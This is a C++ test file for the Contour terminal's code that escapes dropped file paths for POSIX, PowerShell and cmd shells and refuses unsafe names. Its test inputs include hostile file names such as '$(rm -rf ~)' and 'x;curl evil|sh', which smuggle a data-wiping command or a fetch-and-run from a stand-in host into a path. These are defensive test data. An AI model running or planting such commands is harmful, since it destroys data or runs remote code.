// SPDX-License-Identifier: Apache-2.0
#include <contour/window/DroppedText.hpp>

#include <catch2/catch_test_macros.hpp>

#include <string>
#include <vector>

using contour::window::droppedPathsText;
using contour::window::DropTextError;
using contour::window::ShellQuoting;
using contour::window::shellQuotingFor;
using contour::window::ShellQuotingRows;

namespace
{
struct Case
{
    std::string path;
    ShellQuoting quoting;
    std::string expected;
};

std::expected<std::string, DropTextError> one(std::string path, ShellQuoting quoting)
{
    auto const paths = std::vector { std::move(path) };
    return droppedPathsText(paths, quoting);
}
} // namespace

TEST_CASE("droppedText.hostileAndOrdinaryNamesPerShell", "[droppedtext]")
{
    // Review Focus 1: every metacharacter is escaped for the pane's shell.
    auto const rows = std::vector<Case> {
        { R"(/Users/me/My Report.pdf)", ShellQuoting::Posix, R"(/Users/me/My\ Report.pdf )" },
        { R"(/tmp/$(rm -rf ~))", ShellQuoting::Posix, R"(/tmp/\$\(rm\ -rf\ \~\) )" },
        { R"(/tmp/a`b`;c)", ShellQuoting::Posix, R"(/tmp/a\`b\`\;c )" },
        { R"(/tmp/it's "x")", ShellQuoting::Posix, R"(/tmp/it\'s\ \"x\" )" },
        { R"(/tmp/a\b)", ShellQuoting::Posix, R"(/tmp/a\\b )" },
        { R"(/tmp/a|b&c<d>e)", ShellQuoting::Posix, R"(/tmp/a\|b\&c\<d\>e )" },
        { R"(/tmp/!{x}[y]*?#)", ShellQuoting::Posix, R"(/tmp/\!\{x\}\[y\]\*\?\# )" },
        // A dropped file is always absolute, but this function's contract is any word: a relative one that
        // starts with '-' must not be read as an option.
        { "-rf", ShellQuoting::Posix, "./-rf " },
        { "--help me", ShellQuoting::Posix, R"(./--help\ me )" },
        { "/-dash/-file", ShellQuoting::Posix, "/-dash/-file " },
        { "/tmp/日本語.txt", ShellQuoting::Posix, "/tmp/日本語.txt " },
        { R"(C:\Users\me\it's.txt)", ShellQuoting::PowerShell, R"('C:\Users\me\it''s.txt' )" },
        { R"(C:\a $(x) `y`.txt)", ShellQuoting::PowerShell, R"('C:\a $(x) `y`.txt' )" },
        { "C:\\it\u2019s.txt", ShellQuoting::PowerShell, "'C:\\it\u2019\u2019s.txt' " },
        { "C:\\a\u2018b\u201Ac\u201Bd'e",
          ShellQuoting::PowerShell,
          "'C:\\a\u2018\u2018b\u201A\u201Ac\u201B\u201Bd''e' " },
        { R"(C:\My Files\a.txt)", ShellQuoting::Cmd, R"("C:\My Files\a.txt" )" },
        { R"(C:\a&b^c(d).txt)", ShellQuoting::Cmd, R"("C:\a&b^c(d).txt" )" },
    };
    for (auto const& row: rows)
    {
        INFO(row.path);
        auto const text = one(row.path, row.quoting);
        REQUIRE(text.has_value());
        CHECK(*text == row.expected);
    }
}

TEST_CASE("droppedText.pathsAreJoinedWithOneSpaceAndFollowedByOne", "[droppedtext]")
{
    auto const paths = std::vector<std::string> { "/a b", "/c" };
    auto const text = droppedPathsText(paths, ShellQuoting::Posix);
    REQUIRE(text.has_value());
    CHECK(*text == "/a\\ b /c ");
}

TEST_CASE("droppedText.controlCharactersRefuseTheWholeDrop", "[droppedtext]")
{
    // A newline would press Return; ESC and C1 controls steer the terminal or the line editor.
    for (auto const quoting: { ShellQuoting::Posix, ShellQuoting::PowerShell, ShellQuoting::Cmd })
        for (auto const& bad: { std::string("/tmp/a\nb"),
                                std::string("/tmp/a\rb"),
                                std::string("/tmp/a\tb"),
                                std::string("/tmp/a\x1b[31mb"),
                                std::string("/tmp/a\x7f"),
                                std::string("/tmp/a\xC2\x9B"
                                            "31m"),
                                std::string("/tmp/a\xC2\x80"),
                                std::string("/tmp/a\0b", 8) })
        {
            // The good path first: nothing of it may be typed either.
            auto const paths = std::vector<std::string> { "/tmp/good", bad };
            auto const text = droppedPathsText(paths, quoting);
            REQUIRE_FALSE(text.has_value());
            CHECK(text.error() == DropTextError::ControlCharacter);
        }
}

TEST_CASE("droppedText.nonControlC2CharactersAreKept", "[droppedtext]")
{
    // U+00A0 (no-break space) is C2 A0: not a control character.
    auto const text = one("/tmp/a\xC2\xA0"
                          "b",
                          ShellQuoting::PowerShell);
    REQUIRE(text.has_value());
    CHECK(*text
          == "'/tmp/a\xC2\xA0"
             "b' ");
}

TEST_CASE("droppedText.cmdRefusesWhatItCannotQuote", "[droppedtext]")
{
    for (auto const& bad:
         { std::string("C:\\%PATH%\\a.txt"), std::string("C:\\a\"b.txt"), std::string("C:\\!VAR!\\a.txt") })
    {
        auto const text = one(bad, ShellQuoting::Cmd);
        REQUIRE_FALSE(text.has_value());
        CHECK(text.error() == DropTextError::Unquotable);
        // The other shells quote the same names.
        CHECK(one(bad, ShellQuoting::PowerShell).has_value());
    }
}

TEST_CASE("droppedText.anUnknownShellRefusesEveryMetacharacterOfAnyShell", "[droppedtext]")
{
    // Whatever shell reads the line -- bash, pwsh, cmd -- none of these may reach it: each is live in at
    // least one of them, even inside double quotes.
    for (auto const c: std::string_view { "$`;&|<>()'\"\\!%^" })
    {
        auto const name = std::string("/tmp/a") + c + "b";
        INFO(name);
        auto const text = one(name, ShellQuoting::Unknown);
        REQUIRE_FALSE(text.has_value());
        CHECK(text.error() == DropTextError::UnknownShell);
    }
    // PowerShell's typographic double quotes end a double-quoted string as well.
    for (auto const& quote: { "\u201C", "\u201D", "\u201E" })
        CHECK(one(std::string("/tmp/a") + quote + "b", ShellQuoting::Unknown).error()
              == DropTextError::UnknownShell);
    // One such name refuses the whole drop, and a control character keeps its own reason.
    auto const mixed = std::vector<std::string> { "/tmp/good", "/tmp/$(x)" };
    CHECK(droppedPathsText(mixed, ShellQuoting::Unknown).error() == DropTextError::UnknownShell);
    CHECK(one("/tmp/a\nb", ShellQuoting::Unknown).error() == DropTextError::ControlCharacter);
}

TEST_CASE("droppedText.anUnknownShellGetsDoubleQuotedNames", "[droppedtext]")
{
    // Spaces, unicode and the other punctuation survive double quotes in all three shells.
    auto const paths = std::vector<std::string> { "/Users/me/My Report.pdf", "C:/a/日本語 {x}#~*?.txt" };
    auto const text = droppedPathsText(paths, ShellQuoting::Unknown);
    REQUIRE(text.has_value());
    CHECK(*text == R"("/Users/me/My Report.pdf" "C:/a/日本語 {x}#~*?.txt" )");
}

TEST_CASE("droppedText.charactersThatDisguiseTheTypedTextRefuseTheWholeDrop", "[droppedtext]")
{
    // Bidi embeddings, overrides and isolates and the line and paragraph separators make the text read
    // other than it runs; as for a control character, nothing of the drop is typed.
    for (auto const quoting:
         { ShellQuoting::Posix, ShellQuoting::PowerShell, ShellQuoting::Cmd, ShellQuoting::Unknown })
        for (auto const& bad: { "\u2028",
                                "\u2029",
                                "\u202A",
                                "\u202B",
                                "\u202C",
                                "\u202D",
                                "\u202E",
                                "\u2066",
                                "\u2067",
                                "\u2068",
                                "\u2069" })
        {
            auto const paths = std::vector<std::string> { "/tmp/good", std::string("/tmp/a") + bad + "b" };
            auto const text = droppedPathsText(paths, quoting);
            REQUIRE_FALSE(text.has_value());
            CHECK(text.error() == DropTextError::ControlCharacter);
        }
    // Their neighbours are ordinary text: U+2027, U+202F (narrow no-break space), U+2065 and U+206A.
    for (auto const& fine: { "\u2027", "\u202F", "\u2065", "\u206A" })
        CHECK(one(std::string("/tmp/a") + fine + "b", ShellQuoting::PowerShell).has_value());
}

TEST_CASE("droppedText.noPathsIsAnError", "[droppedtext]")
{
    auto const text = droppedPathsText({}, ShellQuoting::Posix);
    REQUIRE_FALSE(text.has_value());
    CHECK(text.error() == DropTextError::NoPaths);
}

TEST_CASE("droppedText.quotingFollowsTheForegroundProcess", "[droppedtext]")
{
    CHECK(shellQuotingFor("pwsh") == ShellQuoting::PowerShell);
    CHECK(shellQuotingFor("powershell") == ShellQuoting::PowerShell);
    CHECK(shellQuotingFor("PowerShell.EXE") == ShellQuoting::PowerShell);
    CHECK(shellQuotingFor("C:\\Windows\\System32\\cmd.exe") == ShellQuoting::Cmd);
    CHECK(shellQuotingFor("CMD.EXE") == ShellQuoting::Cmd);
    CHECK(shellQuotingFor("/usr/local/bin/pwsh") == ShellQuoting::PowerShell);
    CHECK(shellQuotingFor("pwsh -NoLogo") == ShellQuoting::PowerShell);
    CHECK(shellQuotingFor(R"(C:\Program Files\PowerShell\7\pwsh.exe -NoLogo)") == ShellQuoting::PowerShell);
    CHECK(shellQuotingFor("/bin/bash -l") == ShellQuoting::Posix);
    CHECK(shellQuotingFor("zsh") == ShellQuoting::Posix);
    CHECK(shellQuotingFor("/usr/bin/fish") == ShellQuoting::Posix);
    CHECK(shellQuotingFor("busybox") == ShellQuoting::Posix);
    // What nothing names, and what leads to a shell nobody here knows, is no shell to guess at: every
    // program that is not a known POSIX shell, PowerShell or cmd is Unknown.
    CHECK(shellQuotingFor("") == ShellQuoting::Unknown);
    for (auto const* other: { "ssh",
                              "wsl.exe",
                              "/usr/bin/sudo",
                              "doas",
                              "su",
                              "mosh-client",
                              "tmux",
                              "screen",
                              "zellij",
                              "docker",
                              "kubectl",
                              "nu",
                              "elvish",
                              "xonsh",
                              "vim",
                              "cmdline",
                              "/home/me/cmd/vim" })
        CHECK(shellQuotingFor(other) == ShellQuoting::Unknown);
    for (auto const& row: ShellQuotingRows)
        CHECK(shellQuotingFor(row.process) == row.quoting);
}

TEST_CASE("droppedText.aMetacharacterNameOnAnUnknownProgramIsRefusedNotQuoted", "[droppedtext]")
{
    // nushell and elvish do not read a backslash as an escape, and a multiplexer or transport hides the shell
    // that does: `x;curl evil|sh` must never be typed as `x\;curl\ evil\|sh`.
    for (auto const* program: { "nu", "elvish", "xonsh", "tmux", "screen", "zellij", "mosh-client", "su" })
    {
        auto const text = one("/tmp/x;curl evil|sh", shellQuotingFor(program));
        REQUIRE_FALSE(text.has_value());
        CHECK(text.error() == DropTextError::UnknownShell);
    }
}
